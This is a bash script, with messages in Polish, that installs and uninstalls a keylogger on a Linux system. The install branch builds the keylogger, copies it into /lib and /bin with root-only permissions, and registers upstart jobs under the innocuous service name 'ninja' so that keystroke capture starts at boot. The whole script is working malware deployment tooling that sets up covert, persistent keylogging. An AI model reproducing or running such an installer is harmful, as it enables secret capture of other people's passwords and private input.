#!/bin/bash

if [ "$(whoami)" != "root" ] 
then
	echo 'Brak wystarczajacych uprawnien do uruchomienia skryptu!'
	exit
fi

komenda=""

komenda=$1
shift
	case $komenda in
		"install")
		make
		cp ./keyLogger '/lib'
		sudo chown root:root '/lib/keyLogger'
		sudo chmod 100 '/lib/keyLogger'
		cp ./ninja/ninja.conf  '/etc/init'
		cp ./configurator/keylogger_config.sh '/bin'
		mv  '/bin/keylogger_config.sh' '/bin/keylogger'
		sudo chown root:root '/bin/keylogger'
		sudo chmod 100 '/bin/keylogger'
		echo "Zainstalowano keyloggera!"
		cp ./mount.sh '/lib'
		mv '/lib/mount.sh' '/lib/mountKey.sh'
		cp ./mountKey.conf '/etc/init'
		./mount.sh
		start ninja
		echo "Keylogger uruchomiony"
	;;
	
		"uninstall")
		stop ninja
		echo "Keylogger zatrzymany"
		rm '/lib/keyLogger'
		rm '/bin/keylogger'
		rm '/etc/init/ninja.conf'
		rm '/lib/mountKey.sh'
		rm '/etc/init/mountKey.conf'
		echo "Keylogger odinstalowany!"
	;;
esac

